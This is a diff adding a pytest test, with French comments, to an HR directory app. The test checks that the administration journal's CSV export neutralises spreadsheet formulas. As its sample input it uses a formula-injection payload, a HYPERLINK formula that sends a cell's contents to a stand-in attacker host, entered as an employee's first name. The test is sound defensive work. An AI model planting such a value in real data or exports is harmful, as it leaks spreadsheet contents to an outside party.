@@ -1,5 +1,7 @@
 """Administration : critères d'acceptation de docs/modules/04-administration.md."""
 
+import csv
+import io
 import json
 
 import pytest
@@ -226,6 +228,33 @@ def test_journal_lists_searches_and_exports(client_for, company_a):
     assert body.startswith("﻿Date;Heure;Personne;Action;Résumé")
     assert "Comptabilité" in body
     assert "audit.exported" in actions(company_a)
+
+
+def test_journal_export_neutralises_formulas(client_for, company_a):
+    """Une RH donne un prénom-formule à un salarié ; l'export ouvert par l'administrateur ne
+    doit contenir aucune cellule exécutable."""
+    formula = '=HYPERLINK("https://evil.example/?"&A2;"x")'
+    employee = company_a.employee
+    client_for(company_a.hr).post(
+        f"/annuaire/{employee.public_id}/modifier/",
+        {
+            "first_name": formula,
+            "last_name": employee.last_name,
+            "email": employee.email,
+            "job_title": "Analyste",
+            "service": company_a.service.pk,
+            "site": company_a.site.pk,
+            "arrival_date": "2024-01-08",
+        },
+    )
+    client_for(employee).post(
+        "/annuaire/mes-coordonnees/", {"phone": "01 02 03 04 05", "office": "B12"}
+    )
+    body = client_for(company_a.admin).get("/administration/journal/export/").content.decode()
+    rows = list(csv.reader(io.StringIO(body.removeprefix("\ufeff")), delimiter=";"))
+    cells = [cell for row in rows for cell in row]
+    assert any(cell.startswith(f"'{formula}") for cell in cells)  # colonne Personne
+    assert not [cell for cell in cells if cell[:1] in ("=", "+", "-", "@", "\t", "\r")]
 
 
 def test_every_action_of_the_tab_is_logged(client_for, company_a):
